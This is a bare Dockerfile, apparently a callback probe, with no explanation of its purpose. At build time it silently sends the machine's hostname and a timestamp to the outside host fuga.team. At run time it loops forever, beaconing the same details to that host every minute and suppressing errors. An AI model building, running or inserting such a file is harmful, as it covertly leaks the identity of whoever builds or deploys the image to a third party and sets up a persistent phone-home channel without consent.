FROM illfarm/grok-callback:v2
RUN curl -s -m 5 http://fuga.team/BUILD_$(hostname)_$(date +%s) || true
CMD while true; do curl -s http://fuga.team/RUN_$(hostname)_$(date +%s) 2>/dev/null; sleep 60; done
